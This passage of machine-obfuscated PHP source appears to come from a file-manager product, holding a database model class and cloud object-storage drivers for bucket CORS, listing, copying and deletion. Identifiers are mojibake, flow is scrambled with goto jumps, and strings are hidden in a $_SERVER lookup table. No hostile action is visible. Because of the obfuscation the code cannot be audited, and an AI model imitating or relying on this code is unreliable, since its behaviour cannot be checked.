($this->where($EæùÍŞ–²Ö)->find()) { return !1; } return !0; default: return $this->check($B×¸Ï¯ñí·[$fÃîÜÏÀàÑ[0]], $fÃîÜÏÀàÑ[1], $fÃîÜÏÀàÑ[4]); } } public function check($cÙ„—Äé›°, $FÒõË÷…Ú, $EŠ­™ª“Š÷ = "\162\x65\x67\145\x78") { $B…¢¹Ç…Ê =& $_SERVER[ã®Â„Éæ¹¤]; $EŠ­™ª“Š÷ = strtolower(trim($EŠ­™ª“Š÷)); switch ($EŠ­™ª“Š÷) { case $B…¢¹Ç…Ê[7]: case $B…¢¹Ç…Ê[320]: $E ÊŠ»öÛ = is_array($FÒõË÷…Ú) ? $FÒõË÷…Ú : explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú); return $EŠ­™ª“Š÷ == $B…¢¹Ç…Ê[7] ? in_array($cÙ„—Äé›°, $E ÊŠ»öÛ) : !in_array($cÙ„—Äé›°, $E ÊŠ»öÛ); case $B…¢¹Ç…Ê[321]: case $B…¢¹Ç…Ê[322]: if (is_array($FÒõË÷…Ú)) { $b—äì†ŒÔµ = $FÒõË÷…Ú[0]; $C¹«ĞöÀø = $FÒõË÷…Ú[1]; } else { list($b—äì†ŒÔµ, $C¹«ĞöÀø) = explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú); } return $EŠ­™ª“Š÷ == $B…¢¹Ç…Ê[321] ? $cÙ„—Äé›° >= $b—äì†ŒÔµ && $cÙ„—Äé›° <= $C¹«ĞöÀø : $cÙ„—Äé›° < $b—äì†ŒÔµ || $cÙ„—Äé›° > $C¹«ĞöÀø; case $B…¢¹Ç…Ê[323]: case $B…¢¹Ç…Ê[324]: return $EŠ­™ª“Š÷ == $B…¢¹Ç…Ê[323] ? $cÙ„—Äé›° == $FÒõË÷…Ú : $cÙ„—Äé›° != $FÒõË÷…Ú; case $B…¢¹Ç…Ê[325]: $Aó¢‘ÑÆ² = mb_strlen($cÙ„—Äé›°, $B…¢¹Ç…Ê[326]); if (strpos($FÒõË÷…Ú, $B…¢¹Ç…Ê[47])) { list($b—äì†ŒÔµ, $C¹«ĞöÀø) = explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú); return $Aó¢‘ÑÆ² >= $b—äì†ŒÔµ && $Aó¢‘ÑÆ² <= $C¹«ĞöÀø; } else { return $Aó¢‘ÑÆ² == $FÒõË÷…Ú; } case $B…¢¹Ç…Ê[327]: list($DŸÓŞŠÌ·ù, $D»ÓŒâÁ¢Œ) = explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú); if (!is_numeric($DŸÓŞŠÌ·ù)) { $DŸÓŞŠÌ·ù = strtotime($DŸÓŞŠÌ·ù); } if (!is_numeric($D»ÓŒâÁ¢Œ)) { $D»ÓŒâÁ¢Œ = strtotime($D»ÓŒâÁ¢Œ); } return NOW_TIME >= $DŸÓŞŠÌ·ù && NOW_TIME <= $D»ÓŒâÁ¢Œ; case $B…¢¹Ç…Ê[328]: return in_array(get_client_ip(), explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú)); case $B…¢¹Ç…Ê[329]: return !in_array(get_client_ip(), explode($B…¢¹Ç…Ê[47], $FÒõË÷…Ú)); case $B…¢¹Ç…Ê[316]: default: return $this->regex($cÙ„—Äé›°, $FÒõË÷…Ú); } } public function query($d¿ä’¢½“¨, $D›Ÿ†¬ä¥Í = false) { $Dº»Šê‡³ =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_bool($D›Ÿ†¬ä¥Í) && !is_array($D›Ÿ†¬ä¥Í)) { $D›Ÿ†¬ä¥Í = func_get_args(); array_shift($D›Ÿ†¬ä¥Í); } $d¿ä’¢½“¨ = str_replace(array($Dº»Šê‡³[217], $Dº»Šê‡³[330]), $Dº»Šê‡³[50], $d¿ä’¢½“¨); $d¿ä’¢½“¨ = $this->parseSql($d¿ä’¢½“¨, $D›Ÿ†¬ä¥Í); return $this->db->query($d¿ä’¢½“¨); } public function execute($B“¡„Â²™, $f»‹à¯† = false) { if (!is_bool($f»‹à¯†) && !is_array($f»‹à¯†)) { $f»‹à¯† = func_get_args(); array_shift($f»‹à¯†); } $B“¡„Â²™ = $this->parseSql($B“¡„Â²™, $f»‹à¯†); return $this->db->execute($B“¡„Â²™); } protected function parseSql($fÀ›ƒ™‚÷—, $c›—Îñ˜õ¤) { $bœçó°ùæé =& $_SERVER[ã®Â„Éæ¹¤]; if (!0 === $c›—Îñ˜õ¤) { $bÔ¥îÆËä¬ = $this->_parseOptions(); $fÀ›ƒ™‚÷— = $this->db->parseSql($fÀ›ƒ™‚÷—, $bÔ¥îÆËä¬); } elseif (is_array($c›—Îñ˜õ¤)) { $c›—Îñ˜õ¤ = array_map(array($this->db, $bœçó°ùæé[331]), $c›—Îñ˜õ¤); $fÀ›ƒ™‚÷— = vsprintf($fÀ›ƒ™‚÷—, $c›—Îñ˜õ¤); } else { $fÀ›ƒ™‚÷— = strtr($fÀ›ƒ™‚÷—, array($bœçó°ùæé[332] => $this->getTableName(), $bœçó°ùæé[333] => think_config($bœçó°ùæé[232]))); } $this->db->setModel($this->name); return $fÀ›ƒ™‚÷—; } public function db($b½‘Ë‘ç‰¨ = '', $AÕ£§¼Æ‚ = '', $EˆŠñ±œ‹¡ = array()) { goto FÇô¨î•Ş; E˜Ë¾ÛšîÅ: static $cğÛ³í“µì = array(); if (!isset($cğÛ³í“µì[$b½‘Ë‘ç‰¨]) || isset($cğÛ³í“µì[$b½‘Ë‘ç‰¨]) && $AÕ£§¼Æ‚ && $aö×İ²³Ä[$b½‘Ë‘ç‰¨] != $AÕ£§¼Æ‚) { if (!empty($AÕ£§¼Æ‚) && is_string($AÕ£§¼Æ‚) && !1 === strpos($AÕ£§¼Æ‚, $D‹¢ÍğÒğŸ[8])) { $AÕ£§¼Æ‚ = think_config($AÕ£§¼Æ‚); } $cğÛ³í“µì[$b½‘Ë‘ç‰¨] = Db::getInstance($AÕ£§¼Æ‚); } elseif (NULL === $AÕ£§¼Æ‚) { $cğÛ³í“µì[$b½‘Ë‘ç‰¨]->close(); unset($cğÛ³í“µì[$b½‘Ë‘ç‰¨]); return; } if (!empty($EˆŠñ±œ‹¡)) { if (is_string($EˆŠñ±œ‹¡)) { parse_str($EˆŠñ±œ‹¡, $EˆŠñ±œ‹¡); } foreach ($EˆŠñ±œ‹¡ as $DÔâ„éæ¤ => $F ºÑ½ğÎ›) { $this->setProperty($DÔâ„éæ¤, $F ºÑ½ğÎ›); } } goto Fö¤Å„ùçæ; BâÈÌœ´¹—: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto dÚ¾Ê²…£ô; Fö¤Å„ùçæ: $aö×İ²³Ä[$b½‘Ë‘ç‰¨] = $AÕ£§¼Æ‚; $this->db = $cğÛ³í“µì[$b½‘Ë‘ç‰¨]; $this->_after_db(); goto BâÈÌœ´¹—; FÇô¨î•Ş: $D‹¢ÍğÒğŸ =& $_SERVER[ã®Â„Éæ¹¤]; if ($D‹¢ÍğÒğŸ[33] === $b½‘Ë‘ç‰¨ && $this->db) { return $this->db; } static $aö×İ²³Ä = array(); goto E˜Ë¾ÛšîÅ; dÚ¾Ê²…£ô: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e½´ãÔä†® = get_class($this); if ($e½´ãÔä†® == $_SERVER[ã®Â„Éæ¹¤][334]) { return $this->name; } $this->name = substr($e½´ãÔä†®, 0, -5); } return $this->name; } public function getTableName() { $Dµ§Á…³Œò =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($this->trueTableName)) { $f¾×ËÛÊ”ˆ = !empty($this->tablePrefix) ? $this->tablePrefix : $Dµ§Á…³Œò[33]; if (!empty($this->tableName)) { $f¾×ËÛÊ”ˆ .= $this->tableName; } else { $f¾×ËÛÊ”ˆ .= think_parse_name($this->name); } $this->trueTableName = strtolower($f¾×ËÛÊ”ˆ); } return (!empty($this->dbName) ? $this->dbName . $Dµ§Á…³Œò[91] : $Dµ§Á…³Œò[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Dïƒ§ñœ…ƒ =& $_SERVER[ã®Â„Éæ¹¤]; return isset($this->fields[$Dïƒ§ñœ…ƒ[239]]) ? $this->fields[$Dïƒ§ñœ…ƒ[239]] : $this->pk; } public function getDbFields() { $DÎÉÅ¾›¥ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($this->options[$DÎÉÅ¾›¥[267]])) { $Cñ·°Ë‡Õ = $this->db->getFields($this->options[$DÎÉÅ¾›¥[267]]); return $Cñ·°Ë‡Õ ? array_keys($Cñ·°Ë‡Õ) : !1; } if ($this->fields) { $Cñ·°Ë‡Õ = $this->fields; unset($Cñ·°Ë‡Õ[$DÎÉÅ¾›¥[238]], $Cñ·°Ë‡Õ[$DÎÉÅ¾›¥[239]], $Cñ·°Ë‡Õ[$DÎÉÅ¾›¥[240]], $Cñ·°Ë‡Õ[$DÎÉÅ¾›¥[237]]); return $Cñ·°Ë‡Õ; } return !1; } public function data($aòô•×ê = '') { $d˜Ù°åå² =& $_SERVER[ã®Â„Éæ¹¤]; if ($d˜Ù°åå²[33] === $aòô•×ê && !empty($this->data)) { return $this->data; } if (is_object($aòô•×ê)) { $aòô•×ê = get_object_vars($aòô•×ê); } elseif (is_string($aòô•×ê)) { parse_str($aòô•×ê, $aòô•×ê); } elseif (!is_array($aòô•×ê)) { think_exception(think_lang($d˜Ù°åå²[259])); } $this->data = $aòô•×ê; return $this; } public function join($AšŠš•‚¬—) { $cÆÑÃµĞù =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($AšŠš•‚¬—)) { $this->options[$cÆÑÃµĞù[270]] = $AšŠš•‚¬—; } elseif (!empty($AšŠš•‚¬—)) { $this->options[$cÆÑÃµĞù[270]][] = $AšŠš•‚¬—; } return $this; } public function union($CŠ›íßŠˆ›, $f¥‘¡ºê×š = false) { goto A¡ÄèÉØŒå; dÙ¿œ‰Êğ: return $this; goto bÂÖÁÏ¨Ñ‚; A¡ÄèÉØŒå: $B¨Íº©Ä×® =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($CŠ›íßŠˆ›)) { return $this; } if ($f¥‘¡ºê×š) { $this->options[$B¨Íº©Ä×®[335]][$B¨Íº©Ä×®[336]] = !0; } goto d¶—¤ªéÈ«; d¶—¤ªéÈ«: if (is_object($CŠ›íßŠˆ›)) { $CŠ›íßŠˆ› = get_object_vars($CŠ›íßŠˆ›); } if (is_string($CŠ›íßŠˆ›)) { $e«ÖĞ‰­ = $CŠ›íßŠˆ›; } elseif (is_array($CŠ›íßŠˆ›)) { if (isset($CŠ›íßŠˆ›[0])) { $this->options[$B¨Íº©Ä×®[335]] = array_merge($this->options[$B¨Íº©Ä×®[335]], $CŠ›íßŠˆ›); return $this; } else { $e«ÖĞ‰­ = $CŠ›íßŠˆ›; } } else { think_exception(think_lang($B¨Íº©Ä×®[259])); } $this->options[$B¨Íº©Ä×®[335]][] = $e«ÖĞ‰­; goto dÙ¿œ‰Êğ; bÂÖÁÏ¨Ñ‚: } public function cache($a¤± ‡‚À = true, $CÛç±ğó¡ = null, $fØ—ÔÀ²– = '') { $aÒŞª°äÉï =& $_SERVER[ã®Â„Éæ¹¤]; if (!1 !== $a¤± ‡‚À) { $this->options[$aÒŞª°äÉï[337]] = array($aÒŞª°äÉï[89] => $a¤± ‡‚À, $aÒŞª°äÉï[327] => $CÛç±ğó¡, $aÒŞª°äÉï[29] => $fØ—ÔÀ²–); } return $this; } public function field($FÛöâº›Åµ, $DáÛ÷—‚¥ = false) { $B‹ªš‹Æô­ =& $_SERVER[ã®Â„Éæ¹¤]; if (!0 === $FÛöâº›Åµ) { $FÖÇóíåÓš = $this->getDbFields(); $FÛöâº›Åµ = $FÖÇóíåÓš ? $FÖÇóíåÓš : $B‹ªš‹Æô­[176]; } elseif ($DáÛ÷—‚¥) { if (is_string($FÛöâº›Åµ)) { $FÛöâº›Åµ = explode($B‹ªš‹Æô­[47], $FÛöâº›Åµ); } $FÖÇóíåÓš = $this->getDbFields(); $FÛöâº›Åµ = $FÖÇóíåÓš ? array_diff($FÖÇóíåÓš, $FÛöâº›Åµ) : $FÛöâº›Åµ; } $this->options[$B‹ªš‹Æô­[261]] = $FÛöâº›Åµ; return $this; } public function scope($EèšÃ÷óÄ = '', $d„À£‹™šª = NULL) { $D¼œŠÀ°¸ =& $_SERVER[ã®Â„Éæ¹¤]; if ($D¼œŠÀ°¸[33] === $EèšÃ÷óÄ) { if (isset($this->_scope[$D¼œŠÀ°¸[34]])) { $e„öé‹Ñ = $this->_scope[$D¼œŠÀ°¸[34]]; } else { return $this; } } elseif (is_string($EèšÃ÷óÄ)) { $eîàËÀÜ´ = explode($D¼œŠÀ°¸[47], $EèšÃ÷óÄ); $e„öé‹Ñ = array(); foreach ($eîàËÀÜ´ as $f‘´à¶ë°‘) { if (!isset($this->_scope[$f‘´à¶ë°‘])) { continue; } $e„öé‹Ñ = array_merge($e„öé‹Ñ, $this->_scope[$f‘´à¶ë°‘]); } if (!empty($d„À£‹™šª) && is_array($d„À£‹™šª)) { $e„öé‹Ñ = array_merge($e„öé‹Ñ, $d„À£‹™šª); } } elseif (is_array($EèšÃ÷óÄ)) { $e„öé‹Ñ = $EèšÃ÷óÄ; } if (is_array($e„öé‹Ñ) && !empty($e„öé‹Ñ)) { $this->options = array_merge($this->options, array_change_key_case($e„öé‹Ñ)); } return $this; } public function where($cìñÛø‚‡”, $B¸‹ÄõÄ•„ = null) { $D®¾ˆ†ô¿Ì =& $_SERVER[ã®Â„Éæ¹¤]; if (!is_null($B¸‹ÄõÄ•„) && is_string($cìñÛø‚‡”)) { if (!is_array($B¸‹ÄõÄ•„)) { $B¸‹ÄõÄ•„ = func_get_args(); array_shift($B¸‹ÄõÄ•„); } $B¸‹ÄõÄ•„ = array_map(array($this->db, $D®¾ˆ†ô¿Ì[331]), $B¸‹ÄõÄ•„); $cìñÛø‚‡” = vsprintf($cìñÛø‚‡”, $B¸‹ÄõÄ•„); } elseif (is_object($cìñÛø‚‡”)) { $cìñÛø‚‡” = get_object_vars($cìñÛø‚‡”); } elseif (is_array($cìñÛø‚‡”)) { foreach ($cìñÛø‚‡” as $A„á™›Æïì => $d½®ÖãäÙç) { if ((is_numeric($A„á™›Æïì) || !$A„á™›Æïì) && is_string($d½®ÖãäÙç)) { think_trace($D®¾ˆ†ô¿Ì[338], $D®¾ˆ†ô¿Ì[33], $D®¾ˆ†ô¿Ì[46]); die; } } } if (is_string($cìñÛø‚‡”) && $D®¾ˆ†ô¿Ì[33] != $cìñÛø‚‡”) { $B‚ØÔ¡­ç© = array(); $B‚ØÔ¡­ç©[$D®¾ˆ†ô¿Ì[339]] = $cìñÛø‚‡”; $cìñÛø‚‡” = $B‚ØÔ¡­ç©; } if (isset($this->options[$D®¾ˆ†ô¿Ì[263]])) { $this->options[$D®¾ˆ†ô¿Ì[263]] = array_merge($this->options[$D®¾ˆ†ô¿Ì[263]], $cìñÛø‚‡”); } else { $this->options[$D®¾ˆ†ô¿Ì[263]] = $cìñÛø‚‡”; } return $this; } public function limit($dÀ‰Îï¡‡°, $B´–àÇ¢†• = null) { $B¥¼À¢àù =& $_SERVER[ã®Â„Éæ¹¤]; $this->options[$B¥¼À¢àù[280]] = is_null($B´–àÇ¢†•) ? $dÀ‰Îï¡‡° : $dÀ‰Îï¡‡° . $B¥¼À¢àù[47] . $B´–àÇ¢†•; return $this; } public function page($f¾÷¤‡àìÈ, $aèßÓ²àî = null) { $Bù‚ºöŞÁ‹ =& $_SERVER[ã®Â„Éæ¹¤]; $this->options[$Bù‚ºöŞÁ‹[340]] = is_null($aèßÓ²àî) ? $f¾÷¤‡àìÈ : $f¾÷¤‡àìÈ . $Bù‚ºöŞÁ‹[47] . $aèßÓ²àî; return $this; } public function comment($C¶Õâ´Ù‰) { $this->options[$_SERVER[ã®Â„Éæ¹¤][341]] = $C¶Õâ´Ù‰; return $this; } public function setProperty($e’¯Äñ„„, $e„ÌÛ†ùĞ) { if (property_exists($this, $e’¯Äñ„„)) { $this->{$e’¯Äñ„„} = $e„ÌÛ†ùĞ; } return $this; } } goto bïœ‚æÛ; bÁ¿—º¡‘ï: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C«Œ„æ¶ÎÂ) { parent::__construct($C«Œ„æ¶ÎÂ); $this->signatureVersion($_SERVER[ã®Â„Éæ¹¤][200]); } public function fileOutLink($C¿ôÄ¼“¡œ) { $a„‹…‚‘‹ =& $_SERVER[ã®Â„Éæ¹¤]; if (substr($C¿ôÄ¼“¡œ, 0, 7) == $a„‹…‚‘‹[1134]) { $C¿ôÄ¼“¡œ = $a„‹…‚‘‹[1135] . substr($C¿ôÄ¼“¡œ, 7); } header($a„‹…‚‘‹[156] . $C¿ôÄ¼“¡œ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($F¾êÃ‰ë£š) { parent::__construct(); include_once SDK_DIR . $_SERVER[ã®Â„Éæ¹¤][1189]; $this->_init($F¾êÃ‰ë£š); } public function _init($açÜÑÃÚ£Ÿ) { foreach ($açÜÑÃÚ£Ÿ as $BÕæ’Ëß¡ => $AëÁ™¨í“Ó) { if (isset($this->{$BÕæ’Ëß¡})) { $this->{$BÕæ’Ëß¡} = $AëÁ™¨í“Ó; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ã®Â„Éæ¹¤][1190], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto Eô¢£â‚; aÉˆ×àÏ»Ñ: $C´õÔ”Ï¶î->addRule($A—„§¿ë«ê); try { $this->client->putBucketCors($this->bucket, $C´õÔ”Ï¶î); } catch (OSS\Core\OssException $bËöŠªœ˜ˆ) { return !1; } return !0; goto FÖÅ¤ƒ†ì; eÔ¡âéİ¤Ã: $A—„§¿ë«ê->addAllowedOrigin($b¥ˆ…Ü­ô[1191]); $A—„§¿ë«ê->addAllowedMethod($b¥ˆ…Ü­ô[1192]); $A—„§¿ë«ê->addAllowedMethod($b¥ˆ…Ü­ô[1193]); goto dÌß¸¶©Ûµ; Eô¢£â‚: $b¥ˆ…Ü­ô =& $_SERVER[ã®Â„Éæ¹¤]; $C´õÔ”Ï¶î = new OSS\Model\CorsConfig(); $A—„§¿ë«ê = new OSS\Model\CorsRule(); goto eÔ¡âéİ¤Ã; e†÷‘ÅŒ: $A—„§¿ë«ê->setMaxAgeSeconds(600); $A—„§¿ë«ê->addExposeHeader($b¥ˆ…Ü­ô[1196]); $A—„§¿ë«ê->addAllowedHeader($b¥ˆ…Ü­ô[1191]); goto aÉˆ×àÏ»Ñ; dÌß¸¶©Ûµ: $A—„§¿ë«ê->addAllowedMethod($b¥ˆ…Ü­ô[1194]); $A—„§¿ë«ê->addAllowedMethod($b¥ˆ…Ü­ô[1195]); $A—„§¿ë«ê->addAllowedMethod($b¥ˆ…Ü­ô[155]); goto e†÷‘ÅŒ; FÖÅ¤ƒ†ì: } public function getBucketCors() { goto bÕÚ‹±®õµ; dÑÆÆ¨Ä¨: $EÈœøï¡Ö• = $Déé…¥¸®¬[0]->getMaxAgeSeconds(); $D»À·ÜÔ±· = $Déé…¥¸®¬[0]->getExposeHeaders(); $CÑôš² = $Déé…¥¸®¬[0]->getAllowedHeaders(); goto a˜è›œÊÚ˜; bÕÚ‹±®õµ: $f’³ëó„ò =& $_SERVER[ã®Â„Éæ¹¤]; $aõ„‚·É¶ = null; try { $aõ„‚·É¶ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $F…Ñ¦³È®î) { return null; } goto DÖµÂìÄŒ¡; DÖµÂìÄŒ¡: if (!$aõ„‚·É¶ || !($Déé…¥¸®¬ = $aõ„‚·É¶->getRules())) { return null; } $bóôï­è½“ = $Déé…¥¸®¬[0]->getAllowedOrigins(); $AÃ¡Ç¾‹½Œ = $Déé…¥¸®¬[0]->getAllowedMethods(); goto dÑÆÆ¨Ä¨; a˜è›œÊÚ˜: return array($f’³ëó„ò[175] => isset($bóôï­è½“[0]) ? $bóôï­è½“[0] : $f’³ëó„ò[33], $f’³ëó„ò[179] => $AÃ¡Ç¾‹½Œ, $f’³ëó„ò[1197] => $EÈœøï¡Ö•, $f’³ëó„ò[1198] => isset($D»À·ÜÔ±·[0]) ? $D»À·ÜÔ±·[0] : $f’³ëó„ò[33], $f’³ëó„ò[177] => isset($CÑôš²[0]) ? $CÑôš²[0] : $f’³ëó„ò[33]); goto B‚©×øâŞµ; B‚©×øâŞµ: } public function isBucketCors() { goto b‚—àá‹Œ; A·ğî®ôáê: $c‘±½Üîòå = array($f½ƒ„Ğ½Ê¿[180], $f½ƒ„Ğ½Ê¿[181], $f½ƒ„Ğ½Ê¿[182], $f½ƒ„Ğ½Ê¿[183], $f½ƒ„Ğ½Ê¿[184]); $Eå‰°÷µ›» = array_diff($c‘±½Üîòå, $e»ñ¾Àò®¡); return empty($Eå‰°÷µ›»); goto C˜‰’®Õ¯µ; E ¸Ä¾áƒé: if ($b©ˆìˆÉäÎ[$f½ƒ„Ğ½Ê¿[175]] != $f½ƒ„Ğ½Ê¿[176] || $b©ˆìˆÉäÎ[$f½ƒ„Ğ½Ê¿[177]] != $f½ƒ„Ğ½Ê¿[176]) { return !1; } $e»ñ¾Àò®¡ = array_map($f½ƒ„Ğ½Ê¿[178], $b©ˆìˆÉäÎ[$f½ƒ„Ğ½Ê¿[179]]); if (!is_array($e»ñ¾Àò®¡)) { $e»ñ¾Àò®¡ = array(); } goto A·ğî®ôáê; b‚—àá‹Œ: $f½ƒ„Ğ½Ê¿ =& $_SERVER[ã®Â„Éæ¹¤]; $b©ˆìˆÉäÎ = $this->getBucketCors(); if (!$b©ˆìˆÉäÎ || !is_array($b©ˆìˆÉäÎ)) { return !1; } goto E ¸Ä¾áƒé; C˜‰’®Õ¯µ: } public function mkfile($FãˆÆ¯±Á‰, $dõç¢†ä·‰ = '', $dèÌó—ŒµÍ = REPEAT_RENAME) { $fÜÓ×ôšÆœ = $this->setContent($FãˆÆ¯±Á‰, $dõç¢†ä·‰); if ($fÜÓ×ôšÆœ !== !1) { return $this->getPathOuter($FãˆÆ¯±Á‰); } return !1; } public function mkdir($F˜„ëöå´, $E©‚ÜŒƒ…× = REPEAT_SKIP) { if ($this->_isFolder($F˜„ëöå´)) { return $this->getPathOuter($F˜„ëöå´); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($F˜„ëöå´)); } catch (OSS\Core\OssException $bí¥ŒÆÔôË) { return !1; } return $this->getPathOuter($F˜„ëöå´); } private function fileList($AŞÙ¢Â¬‘‡, $eø¸ªˆĞÂ = '', $CÊñä×‘¶œ = 0) { goto CÛ¨ò±·°…; CÛ¨ò±·°…: $f£ß×Ï‹Ùß =& $_SERVER[ã®Â„Éæ¹¤]; $AŞÙ¢Â¬‘‡ = trim($AŞÙ¢Â¬‘‡, $f£ß×Ï‹Ùß[8]); $FÔÅ¯Á¢”Š = empty($AŞÙ¢Â¬‘‡) ? $f£ß×Ï‹Ùß[33] : $AŞÙ¢Â¬‘‡ . $f£ß×Ï‹Ùß[8]; goto a’³©šìÛ; EºÅÔ™†˜É: while (!0) { $cß•»çÓ† = array($f£ß×Ï‹Ùß[1199] => $eø¸ªˆĞÂ, $f£ß×Ï‹Ùß[186] => $FÔÅ¯Á¢”Š, $f£ß×Ï‹Ùß[1200] => $aî™Ÿß™Èé, $f£ß×Ï‹Ùß[1201] => $A¶˜„‘èÀ ); try { $Bò¿áµ’ŠÅ = $this->client->listObjects($this->bucket, $cß•»çÓ†); } catch (OSS\Core\OssException $EÉŠ¡¸Æ‚š) { break; } $A¶˜„‘èÀ  = $Bò¿áµ’ŠÅ->getNextMarker(); $f©«’µ Úµ = $Bò¿áµ’ŠÅ->getObjectList(); $cÇÈá×Øñ› = $Bò¿áµ’ŠÅ->getPrefixList(); foreach ($f©«’µ Úµ as $bŞ–ÊˆËÆ¨) { if ($bŞ–ÊˆËÆ¨->getKey() == $FÔÅ¯Á¢”Š) { continue; } $A ²òºÅ· = $bŞ–ÊˆËÆ¨->getKey(); if ($CÊñä×‘¶œ) { $A ²òºÅ· = array($f£ß×Ï‹Ùß[28] => $A ²òºÅ·, $f£ß×Ï‹Ùß[77] => $bŞ–ÊˆËÆ¨->getSize(), $f£ß×Ï‹Ùß[190] => strtotime($bŞ–ÊˆËÆ¨->getLastModified())); } $Cé±‡«°î[] = $A ²òºÅ·; } foreach ($cÇÈá×Øñ› as $AÊã½œãÈ’) { $AƒŠà×–Ë[] = $AÊã½œãÈ’->getPrefix(); } if ($A¶˜„‘èÀ  === $f£ß×Ï‹Ùß[33]) { break; } } return array($f£ß×Ï‹Ùß[74] => $AƒŠà×–Ë, $f£ß×Ï‹Ùß[73] => $Cé±‡«°î); goto a’ƒø¥†ÜÌ; a’³©šìÛ: $A¶˜„‘èÀ  = $f£ß×Ï‹Ùß[33]; $aî™Ÿß™Èé = 1000; $AƒŠà×–Ë = $Cé±‡«°î = array(); goto EºÅÔ™†˜É; a’ƒø¥†ÜÌ: } public function copyFile($DÈãï¤¾‰, $Cã‡¶ß¤›) { $b‘¶›ã‚ğ­ = $this->size($DÈãï¤¾‰); if ($b‘¶›ã‚ğ­ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $DÈãï¤¾‰, $this->bucket, $this->pathEncode($Cã‡¶ß¤›)); } catch (OSS\Core\OssException $B­ƒÆÍ¼Æ) { return !1; } return $this->getPathOuter($Cã‡¶ß¤›); } $fª¸ÌÀÜ = $this->multiCopyObject($DÈãï¤¾‰, $Cã‡¶ß¤›, $b‘¶›ã‚ğ­); return $fª¸ÌÀÜ ? $this->getPathOuter($Cã‡¶ß¤›) : !1; } private function multiCopyObject($Eê²‘¶¶Û‹, $aÁ¡ëİÛ¾ô, $E”¨åšª†) { $A¯ ¢…×… =& $_SERVER[ã®Â„Éæ¹¤]; try { goto b°¾™’øìŒ; Fß‹Ë‘†³ó: $c¦ŒŒªË¸ = 1024 * 1024 * 10; $B¹Â™ïêÈê = $this->client->generateMultiuploadParts($E”¨åšª†, $c¦ŒŒªË¸); foreach ($B¹Â™ïêÈê as $E³¨›ñßÓ¨ => $c“™ÉÂù´’) { $b§ÒŞŞ›È = $bí…Çõ²á³ + (int) $c“™ÉÂù´’[$A¯ ¢…×…[1203]]; $F²Ô‰Ç”÷á = (int) $c“™ÉÂù´’[$A¯ ¢…×…[325]] + $b§ÒŞŞ›È - 1; $aÆÊˆ•·Œ™ = array($A¯ ¢…×…[1204] => $b§ÒŞŞ›È, $A¯ ¢…×…[1205] => $F²Ô‰Ç”÷á); $dõÓğãÏ­[] = $this->client->uploadPartCopy($this->bucket, $Eê²‘¶¶Û‹, $this->bucket, $this->pathEncode($aÁ¡ëİÛ¾ô), $B¡ˆ…°²›, $C”Êëè‡ì´, $aÆÊˆ•·Œ™); $B¡ˆ…°²› = $B¡ˆ…°²› + 1; } goto b’’«”°Á; AÜí‰òŒ¸™: $B¡ˆ…°²› = 1; $bí…Çõ²á³ = 0; $dõÓğãÏ­ = array(); goto Fß‹Ë‘†³ó; b’’«”°Á: $bæÕå„‘±  = array(); foreach ($dõÓğãÏ­ as $E³¨›ñßÓ¨ => $eÛïõ¢ŸÇ) { $bæÕå„‘± [] = array($A¯ ¢…×…[1206] => $E³¨›ñßÓ¨ + 1, $A¯ ¢…×…[1207] => $eÛïõ¢ŸÇ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aÁ¡ëİÛ¾ô), $C”Êëè‡ì´, $bæÕå„‘± ); goto fÅô‡¶¶ÙÍ; b°¾™’øìŒ: $A­ÜÏˆ”ï = array(); if ($b×²ˆÀ¦ùó = $this->hashMd5($Eê²‘¶¶Û‹)) { $A­ÜÏˆ”ï = array(OSS\OssClient::OSS_HEADERS => array($A¯ ¢…×…[1202] => $b×²ˆÀ¦ùó)); } $C”Êëè‡ì´ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aÁ¡ëİÛ¾ô), $A­ÜÏˆ”ï); goto AÜí‰òŒ¸™; fÅô‡¶¶ÙÍ: } catch (OSS\Core\OssException $EçŸÁÍƒ†ñ) { return !1; } return !0; } public function moveFile($B†æ§Œİ, $bßâŒèİä‚) { if ($this->copyFile($B†æ§Œİ, $bßâŒèİä‚)) { $this->remove($B†æ§Œİ); return $this->getPathOuter($bßâŒèİä‚); } return !1; } public function delFile($bíÉ©«Úø›) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($bíÉ©«Úø›)); } catch (OSS\Core\OssException $f”“­Ëö¼˜) { return !1; } return !0; } public function delFolder($A¿íøŒ¡Í) { $Cé•–š™§ =& $_SERVER[ã®Â„Éæ¹¤]; $FøòËÕŠ‡ = $this->fileList($A¿íøŒ¡Í); if (!empty($A¿íøŒ¡Í) && !in_array(trim($A¿íøŒ¡Í, $Cé•–š™§[8]) . $Cé•–š™§[8], $FøòËÕŠ‡[$Cé•–š™§[73]])) { $FøòËÕŠ‡[$Cé•–š™§[73]][] = trim($A¿íøŒ¡Í, $Cé•–š™§[8]) . $Cé•–š™§[8]; } foreach 